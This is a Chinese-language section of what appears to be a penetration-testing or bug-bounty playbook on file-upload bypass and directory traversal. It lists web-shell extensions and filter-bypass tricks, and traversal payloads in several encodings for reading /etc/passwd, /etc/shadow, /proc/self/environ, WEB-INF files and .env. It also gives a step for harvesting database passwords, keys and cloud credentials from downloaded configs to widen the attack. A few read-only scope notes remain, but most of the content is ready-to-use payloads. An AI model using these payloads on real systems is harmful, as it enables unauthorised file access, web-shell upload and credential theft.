# §3 文件上传 & 文件下载（目录穿越）
### 识别信号
- 上传: Content-Type: multipart/form-data, 路径 /upload /file /import
- 下载: 路径 /download /file/download /files/{filename} /export

### 决策流程
```
发现文件上传接口?
  上传合法文件记录路径+后缀+Content-Type
  → 尝试绕过: .php .php5 .jsp .jspx .asp .aspx (大小写/双后缀/空格/::$DATA)
  → 成功=高危; 拦截→改Content-Type→路径穿越→.htaccess

发现文件下载接口?
  ├── Step1: 先试当前文件名 → 200/404/报错
  │   → 不管返回什么,下一步一定是目录穿越
  │
  ├── Step2: 目录穿越 Fuzzing(强制步骤,不能跳过):
  │   Linux:    ..%2f..%2f..%2fetc%2fpasswd
  │             ../../../../etc/passwd
  │             ..%252f..%252f..%252f..%252fetc%252fpasswd (二次编码)
  │   Windows:  ..%2f..%2f..%2f..%2fWINDOWS%2fwin.ini
  │             ..\..\..\..\Windows\win.ini
  │   Java项目: ..%2f..%2fWEB-INF%2fweb.xml
  │             ..%2f..%2fWEB-INF%2fclasses%2fapplication.yml
  │   Python项目: ..%2f..%2f..%2fapp.py
  │                ..%2f..%2f..%2f.env
  │
  ├── Step3: 如果下载成功 → 高危/严重(任意文件读取)
  │   [SRC] 只读系统文件确认危害,不写文件不修改
  │   [SRC] 读到 /etc/passwd 或 web.xml 即可确认
  │
  └── Step4: 结合下载的文件内容扩大战果
      application.yml → 数据库密码/密钥/云凭证 → 进 §19 OSS
      web.xml → 过滤器链/鉴权配置 → 进 §1 IDOR
      .env → 环境变量/密钥 → 进 cve-chains 密钥利用
```

### Payload
```
PHP: .php .php5 .phtml .pht .phar .shtml
JSP: .jsp .jspx .jspf
ASP: .asp .aspx .ashx .asmx .cer .asa
绕过: .php%00.jpg .php<space> .Php .php::$DATA shell.jpg.php

目录穿越:
  Linux: ../../../../etc/passwd
          ../../../../etc/shadow (只确认存在,不读内容)
          ../../../../proc/self/environ
  Windows: ..\..\..\..\Windows\win.ini
           ..\..\..\..\boot.ini
  Java:   ..%2f..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml
          ..%2f..%2f..%2f..%2fWEB-INF%2fclasses%2fapplication.properties
          注意: nginx 通常解码一次 %2f,部分Java容器会再解码一次
```
